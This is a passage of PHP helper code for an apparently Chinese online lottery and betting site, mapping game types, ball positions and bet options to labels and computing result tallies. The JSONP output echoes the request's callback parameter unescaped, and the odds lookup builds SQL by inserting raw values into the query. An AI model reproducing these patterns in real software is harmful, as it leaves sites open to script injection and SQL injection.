		$json_string = json_encode($arr);   
		if($_REQUEST['callback']) echo $_REQUEST['callback']."(".$json_string.");";
		else echo $json_string;
		exit;
}

function get_gameName($type){
	$game=0;
	switch($type){
		case 0 : $game='廣東快樂十分';break;
		case 1 : $game='廣東快樂十分';break;
		case 2 : $game='重慶時時彩';break;
		case 3 : $game='极速时时彩';break;
		case 4 : $game='极速赛车';break;
		case 5 : $game='幸运28';break;
		case 6 : $game='北京赛车PK10';break;
		case 7 : $game='吉林快3';break;
		case 8 : $game='快樂8';break;
		case 9 : $game='幸运农场';break;
		case 10 : $game='新疆时时彩';break;
		case 11 : $game='天津时时彩';break;
	}
	return $game;
}

function get_gamesmName($type){
	$game=0;
	switch($type){
		case 0 : $game='KL10';break;
		case 1 : $game='KL10';break;
		case 2 : $game='CQSC';break;
		case 3 : $game='qtwfc';break;
		case 4 : $game='XYFT';break;
		case 5 : $game='XY28';break;
		case 6 : $game='PK10';break;
		case 7 : $game='JSK3';break;
		case 8 : $game='KL8';break;
		case 9 : $game='XYNC';break;
		case 10 : $game='xjssc';break;
		case 11 : $game='tjssc';break;
	}
	return $game;
}

function get_dName($type){
	$game=0;
	switch($type){
		case 'd1' : $game='第一球';break;
		case 'd2' : $game='第二球';break;
		case 'd3' : $game='第三球';break;
		case 'd4' : $game='第四球';break;
		case 'd5' : $game='第五球';break;
		case 'd6' : $game='第六球';break;
		case 'd7' : $game='第七球';break;
		case 'd8' : $game='第八球';break;
	}
	return $game;
}

function get_ballname($type,$ball,$h){
	$ball_name='';	
	if($type==0 || $type==9){
		switch($ball){
			case 'Ball_1' :$ball_name='第一球';break;
			case 'Ball_2' :$ball_name='第二球';break;
			case 'Ball_3' :$ball_name='第三球';break;
			case 'Ball_4' :$ball_name='第四球';break;
			case 'Ball_5' :$ball_name='第五球';break;
			case 'Ball_6' :$ball_name='第六球';break;
			case 'Ball_7' :$ball_name='第七球';break;
			case 'Ball_8' :$ball_name='第八球';break;
			case 'Ball_9' :$ball_name='總和、龍虎';break;
			case 'Ball_10' :
				if($h=='h1'){$ball_name='任選二';break;}
				elseif($h=='h2'){$ball_name='選二連直';break;}
				elseif($h=='h3'){$ball_name='選二連組';break;}
				elseif($h=='h4'){$ball_name='任選三';break;}
				elseif($h=='h5'){$ball_name='選三前直';break;}
				elseif($h=='h6'){$ball_name='選三前組';break;}
				elseif($h=='h7'){$ball_name='任選四';break;}
				elseif($h=='h8'){$ball_name='任選五';break;}
		}
	}elseif($type==2 || $type==3 || $type==10 || $type==11){
		switch($ball){
			case 'Ball_1' :$ball_name='第一球';break;
			case 'Ball_2' :$ball_name='第二球';break;
			case 'Ball_3' :$ball_name='第三球';break;
			case 'Ball_4' :$ball_name='第四球';break;
			case 'Ball_5' :$ball_name='第五球';break;
			case 'Ball_6' :$ball_name='總和、龍虎和';break;
			case 'Ball_7' :$ball_name='前三';break;
			case 'Ball_8' :$ball_name='中三';break;
			case 'Ball_9' :$ball_name='后三';break;
		}
	}elseif($type==4|| $type==6){
		switch($ball){
			case 'Ball_1' :$ball_name='冠军';break;
			case 'Ball_2' :$ball_name='亚军';break;
			case 'Ball_3' :$ball_name='第三名';break;
			case 'Ball_4' :$ball_name='第四名';break;
			case 'Ball_5' :$ball_name='第五名';break;
			case 'Ball_6' :$ball_name='第六名';break;
			case 'Ball_7' :$ball_name='第七名';break;
			case 'Ball_8' :$ball_name='第八名';break;
			case 'Ball_9' :$ball_name='第九名';break;
			case 'Ball_10' :$ball_name='第十名';break;
			case 'Ball_11' :$ball_name='冠、亞軍和';break;
			case 'Ball_12' :$ball_name='冠亞和';break;
		}
	}elseif($type==7){
		switch($ball){
			case 'Ball_1' :$ball_name='三军';break;
			case 'Ball_2' :$ball_name='三军';break;
			case 'Ball_3' :$ball_name='圍骰';break;
			case 'Ball_4' :$ball_name='點數';break;
			case 'Ball_5' :$ball_name='長牌';break;
			case 'Ball_6' :$ball_name='短牌';break;
		}
	}elseif($type==8){
		switch($ball){
			case 'Ball_1' :$ball_name='正碼';break;
			case 'Ball_2' :$ball_name='總和大小';break;
			case 'Ball_3' :$ball_name='總和單雙';break;
			case 'Ball_4' :$ball_name='總和和局';break;
			case 'Ball_5' :$ball_name='總和過關';break;
			case 'Ball_6' :$ball_name='前後和';break;
			case 'Ball_7' :$ball_name='單雙和';break;
			case 'Ball_8' :$ball_name='五行';break;
		}
	}
	return $ball_name;
}
function get_wfname($type,$ball,$h){
	$game='';
	if($type==0 || $type==9){
		if($ball=='Ball_1' || $ball=='Ball_2' || $ball=='Ball_3' || $ball=='Ball_4' || $ball=='Ball_5' || $ball=='Ball_6' || $ball=='Ball_7' || $ball=='Ball_8'){
			switch($h){
				case 'h1' :$game='01';break;
				case 'h2' :$game='02';break;
				case 'h3' :$game='03';break;
				case 'h4' :$game='04';break;
				case 'h5' :$game='05';break;
				case 'h6' :$game='06';break;
				case 'h7' :$game='07';break;
				case 'h8' :$game='08';break;
				case 'h9' :$game='09';break;
				case 'h10' :$game='10';break;
				case 'h11' :$game='11';break;
				case 'h12' :$game='12';break;
				case 'h13' :$game='13';break;
				case 'h14' :$game='14';break;
				case 'h15' :$game='15';break;
				case 'h16' :$game='16';break;
				case 'h17' :$game='17';break;
				case 'h18' :$game='18';break;
				case 'h19' :$game='19';break;
				case 'h20' :$game='20';break;
				case "h21": $game = '大'; break;
				case "h22": $game = '小'; break;
				case "h23": $game = '單'; break;
				case "h24": $game = '雙'; break;
				case "h25": $game = '尾大'; break;
				case "h26": $game = '尾小'; break;
				case "h27": $game = '合數單'; break;
				case "h28": $game = '合數雙'; break;
				case "h29": $game = '東'; break;
				case "h30": $game = '南'; break;
				case "h31": $game = '西'; break;
				case "h32": $game = '北'; break;
				case "h33": $game = '中'; break;
				case "h34": $game = '發'; break;
				case "h35": $game = '白'; break;
			}
		}elseif($ball=='Ball_9'){
			switch($h){
				case 'h1' :$game='總和大';break;
				case 'h2' :$game='總和單';break;
				case 'h3' :$game='總和小';break;
				case 'h4' :$game='總和雙';break;
				case 'h5' :$game='總和尾大';break;
				case 'h6' :$game='龍';break;
				case 'h7' :$game='總和尾小';break;
				case 'h8' :$game='虎';break;
			}
		}elseif($ball=='Ball_10'){
			switch($h){
				case 'h1' :$game='1';break;
				case 'h2' :$game='1';break;
				case 'h3' :$game='1';break;
				case 'h4' :$game='1';break;
				case 'h5' :$game='1';break;
				case 'h6' :$game='1';break;
				case 'h7' :$game='1';break;
				case 'h8' :$game='1';break;
			}
		}
	}elseif($type==2 || $type==3 || $type==10 || $type==11){
		if($ball=='Ball_1' || $ball=='Ball_2' || $ball=='Ball_3' || $ball=='Ball_4' || $ball=='Ball_5'){
			switch($h){
				case 'h1' :$game='0';break;
				case 'h2' :$game='1';break;
				case 'h3' :$game='2';break;
				case 'h4' :$game='3';break;
				case 'h5' :$game='4';break;
				case 'h6' :$game='5';break;
				case 'h7' :$game='6';break;
				case 'h8' :$game='7';break;
				case 'h9' :$game='8';break;
				case 'h10' :$game='9';break;
				case 'h11' :$game='大';break;
				case 'h12' :$game='小';break;
				case 'h13' :$game='單';break;
				case 'h14' :$game='雙';break;
			}
		}elseif($ball=='Ball_6'){
			switch($h){
				case 'h1' :$game='總和大';break;
				case 'h2' :$game='總和小';break;
				case 'h3' :$game='總和單';break;
				case 'h4' :$game='總和雙';break;
				case 'h5' :$game='龍';break;
				case 'h6' :$game='虎';break;
				case 'h7' :$game='和';break;
			}
		}elseif($ball=='Ball_7' || $ball=='Ball_8' || $ball=='Ball_9'){
			switch($h){
				case 'h1' :$game='豹子';break;
				case 'h2' :$game='順子';break;
				case 'h3' :$game='對子';break;
				case 'h4' :$game='半順';break;
				case 'h5' :$game='雜六';break;
			}
		}
	}elseif($type==4|| $type==6){
		if($ball=='Ball_1' || $ball=='Ball_2' || $ball=='Ball_3' || $ball=='Ball_4' || $ball=='Ball_5'|| $ball=='Ball_6' || $ball=='Ball_7' || $ball=='Ball_8' || $ball=='Ball_9' || $ball=='Ball_10'){
			switch($h){
				case 'h1' :$game='1';break;
				case 'h2' :$game='2';break;
				case 'h3' :$game='3';break;
				case 'h4' :$game='4';break;
				case 'h5' :$game='5';break;
				case 'h6' :$game='6';break;
				case 'h7' :$game='7';break;
				case 'h8' :$game='8';break;
				case 'h9' :$game='9';break;
				case 'h10' :$game='10';break;
				case 'h11' :$game='大';break;
				case 'h12' :$game='小';break;
				case 'h13' :$game='單';break;
				case 'h14' :$game='雙';break;
				case 'h15' :$game='龍';break;
				case 'h16' :$game='虎';break;
			}
		}elseif($ball=='Ball_11'){
			switch($h){
				case 'h1' :$game='3';break;
				case "h2": $game='4'; break;
				case "h3": $game='5'; break;
				case "h4": $game='6'; break;
				case "h5": $game='7'; break;
				case "h6": $game='8'; break;
				case "h7": $game='9'; break;
				case "h8": $game='10'; break;
				case "h9": $game='11'; break;
				case "h10": $game='12'; break;
				case "h11": $game='13'; break;
				case "h12": $game='14'; break;
				case "h13": $game='15'; break;
				case "h14": $game='16'; break;
				case "h15": $game='17'; break;
				case "h16": $game='18'; break;
				case "h17": $game='19'; break;
			}
		}elseif($ball=='Ball_12'){
			switch($h){
				case 'h1' :$game='冠亞和大';break;
				case "h2": $game='冠亞和小'; break;
				case "h3": $game='冠亞和單'; break;
				case "h4": $game='冠亞和雙'; break;
			}
		}
	}elseif($type==7){
		if($ball=='Ball_1'){
			switch($h){
				case 'h1' :$game='1';break;
				case 'h2' :$game='2';break;
				case 'h3' :$game='3';break;
				case 'h4' :$game='4';break;
				case 'h5' :$game='5';break;
				case 'h6' :$game='6';break;
			}
		}elseif($ball=='Ball_2'){
			switch($h){
				case 'h1' :$game='大';break;
				case 'h2' :$game='小';break;
				case 'h3' :$game='3';break;
				case 'h4' :$game='4';break;
				case 'h5' :$game='5';break;
				case 'h6' :$game='6';break;
			}
		}elseif($ball=='Ball_3'){
			switch($h){
				case 'h1' :$game='1';break;
				case 'h2' :$game='2';break;
				case 'h3' :$game='3';break;
				case 'h4' :$game='4';break;
				case 'h5' :$game='5';break;
				case 'h6' :$game='6';break;
				case 'h7' :$game='全骰';break;
			}
		}elseif($ball=='Ball_4'){
			switch($h){
				case "h1": $game='4'; break;
				case "h2": $game='5'; break;
				case "h3": $game='6'; break;
				case "h4": $game='7'; break;
				case "h5": $game='8'; break;
				case "h6": $game='9'; break;
				case "h7": $game='10'; break;
				case "h8": $game='11'; break;
				case "h9": $game='12'; break;
				case "h10": $game='13'; break;
				case "h11": $game='14'; break;
				case "h12": $game='15'; break;
				case "h13": $game='16'; break;
				case "h14": $game='17'; break;
			}
		}elseif($ball=='Ball_5'){
			switch($h){
				case "h1": $game='1,2'; break;
				case "h2": $game='1,3'; break;
				case "h3": $game='1,4'; break;
				case "h4": $game='1,5'; break;
				case "h5": $game='1,6'; break;
				case "h6": $game='2,3'; break;
				case "h7": $game='2,4'; break;
				case "h8": $game='2,5'; break;
				case "h9": $game='2,6'; break;
				case "h10": $game='3,4'; break;
				case "h11": $game='3,5'; break;
				case "h12": $game='3,6'; break;
				case "h13": $game='4,5'; break;
				case "h14": $game='4,6'; break;
				case "h15": $game='5,6'; break;
			}
		}elseif($ball=='Ball_6'){
			switch($h){
				case 'h1' :$game='1';break;
				case 'h2' :$game='2';break;
				case 'h3' :$game='3';break;
				case 'h4' :$game='4';break;
				case 'h5' :$game='5';break;
				case 'h6' :$game='6';break;
			}
		}
	}elseif($type==8){
		if($ball=='Ball_1'){
			for($i=1;$i<=80;$i++){
				if($h=="h".$i){
					$game=BuLing($i);break;
				}
			}		
			
		}elseif($ball=='Ball_2'){
			switch($h){
				case 'h1' :$game='總和大';break;
				case 'h2' :$game='總和小';break;
			}
		}elseif($ball=='Ball_3'){
			switch($h){
				case 'h1' :$game='總和單';break;
				case 'h2' :$game='總和雙';break;
			}
		}elseif($ball=='Ball_4'){
			switch($h){
				case 'h1' :$game='總和810';break;
			}
		}elseif($ball=='Ball_5'){
			switch($h){
				case 'h1' :$game='總大單';break;
				case 'h2' :$game='總大雙';break;
				case 'h3' :$game='總小單';break;
				case 'h4' :$game='總小雙';break;
			}
		}elseif($ball=='Ball_6'){
			switch($h){
				case 'h1' :$game='前(多)';break;
				case 'h2' :$game='後(多)';break;
				case 'h3' :$game='前後(和)';break;
			}
		}elseif($ball=='Ball_7'){
			switch($h){
				case 'h1' :$game='單(多)';break;
				case 'h2' :$game='雙(多)';break;
				case 'h3' :$game='單雙(和)';break;
			}
		}elseif($ball=='Ball_8'){
			switch($h){
				case 'h1' :$game='金';break;
				case 'h2' :$game='木';break;
				case 'h3' :$game='水';break;
				case 'h4' :$game='火';break;
				case 'h5' :$game='土';break;
			}
		}
	}
	return $game;
}
/*
数字补0函数，当数字小于10的时候在前面自动补0
*/
function BuLing ( $num ) {
	if ( $num<10 ) {
		$num = '0'.$num;
	}
	return $num;
}
//时间差
function timediff($begin_time,$end_time) 
{ 
      if($begin_time < $end_time){ 
         $starttime = $begin_time; 
         $endtime = $end_time; 
      } 
      else{ 
         $starttime = $end_time; 
         $endtime = $begin_time; 
      } 
      $timediff = $endtime-$starttime; 
      $days = intval($timediff/86400); 
      $remain = $timediff%86400; 
      $hours = intval($remain/3600); 
      $remain = $remain%3600; 
      $mins = intval($remain/60); 
      $secs = $remain%60; 
      $res = array("day" => $days,"hour" => $hours,"min" => $mins,"sec" => $secs); 
      return $res; 
}

function getodds_ftype($s_type, $select,$gametype=''){
		$gametype=$gametype<2 ? '' : $gametype;
		$db = new DB();
		$sql = "SELECT {$select} FROM `g_odds".$gametype."` WHERE `g_type` = '{$s_type}' LIMIT 1 ";
		$result = $db->query($sql, 1);
		return $result[0][$select];
}

function sum_str_s_nc ($result, $index, $int=25, $bool=FALSE, $num=NULL, $count=NULL, $p=1)
{
	$k =null;
	$ball = null;
	$stratTd = '<td class="z_cl">';
	$topTd = '</td>,<td class="z_cl">';
	$td = array();
	$ar = array();
	for ($i=0; $i<count($result); $i++)
	{
		$ball = @$result[$i][$index];
		if ($bool && Copyright) //龍虎
		{
			$ar[0] = $result[$i][0];
			$ar[1] = $result[$i][7];
			$ball = sum_ball_str_a_nc($ar, 0, $p);
		}
		else if ($num)
		{
			$ball = sum_ball_string_nc($ball, $num, $p);
		}
		else if ($count)
		{
			$v = $result[$i][0]+$result[$i][1]+$result[$i][2]+$result[$i][3]+$result[$i][4]+$result[$i][5]+$result[$i][6]+$result[$i][7];
			$ball = sum_ball_str_a_nc($v, $count, $p);
		}
		if ($k != $ball){
			$str .= $i == 0 ?  $stratTd.$ball : $topTd.$ball;	
			}
		else 
			$str .= '<br />'.$ball;
		$k = $ball;
	}
	$str .= '</td>';
	$arr = explode(',', $str);
	for ($i=0; $i<25; $i++)
	{
		$td[] ='<td class="z_cl"></td>';
	}

	$arr = array_merge($td,$arr);
	$arr = array_slice($arr, -25);
	return $arr;
}

function sum_ball_str_a_nc ($ball, $index, $p=1)
{
	if ($index==0 || $index==1) //計算龍虎
	{
		if ($ball[0] > $ball[1])
			//return '家禽';
			return '龙';
		else
			//return '野兽';
			return '虎';
	}
	else if ($index==2 || $index==3) //計算總和大小
	{
		if ($ball == 84)
			return '和';
		else if ($ball >=85 && Copyright)
			return $p == 1 ? '總和大' : '大';
		else
			return $p == 1 ? '總和小' : '小';
	}
	else if ($index==4 || $index==5) //計算總和單雙
	{
		if ($ball % 2 == 0) 
			return $p == 1 ? '總和雙' : '雙';
		else 
			return $p == 1 ? '總和單' : '單';
	}
	else if ($index==6 || $index==7) //計算總和尾大小
	{
		$ball=substr($ball, -1);
		if ($ball >=5)
			return $p == 1 ? '總和尾大' : '大';
		else
			return $p == 1 ? '總和尾小' : '小';
	}
}

function sum_ball_string_nc ($ball, $index, $p=1)
{
	$number = $ball;
	if ($index==0 || $index==1) //計算單雙
	{
		if ($number%2 == 0) 
			return '雙';
		else 
			return '單';
	}
	else if ($index==2 || $index==3) //計算大小
	{
		if ($number<=10) 
			return '小';
		else 
			return '大';
	}
	else if ($index==4 || $index==5) //計算尾數大小
	{
		$i = mb_strlen($number);
		if ($i > 1)
			$number=substr($number, -1);
		if ($number >=5)
			return $p == 1 ? '尾大' : '大';
		else
			return $p == 1 ? '尾小' : '小';
	}
	else if ($index==6 || $index==7) //計算合數單雙
	{
		if ($number == 1 || $number == 3 || $number == 5 || $number == 7 || $number == 9 || $number == 10 || $number == 12 || $number == 14 || $number == 16 || $number == 18)
			return $p == 1 ? '合數單' : '單';
		else
			return $p == 1 ? '合數雙' : '雙';
	}
	else if ($index == 8) //計算方位
	{
		if ($number == 1 || $number == 5 || $number == 9 || $number == 13 || $number == 17)
			return '梅';
		else if ($number == 2 || $number == 6 || $number == 10 || $number == 14 || $number == 18)
			return '兰';
		else if ($number == 3 || $number == 7 || $number == 11 || $number == 15 || $number == 19)
			return '菊';
		else
			return '竹';
	}
	else if ($index == 9) //計算中發白
	{
		if ($number == 1 || $number == 2 || $number == 3 || $number == 4 || $number == 5 || $number == 6 || $number == 7)
			return '中';
		else if ($number == 8 || $number == 9 || $number == 10 || $number == 11 || $number == 12 || $number == 13 || $number == 14)
			return '發';
		else
			return '白';
	}
}



?>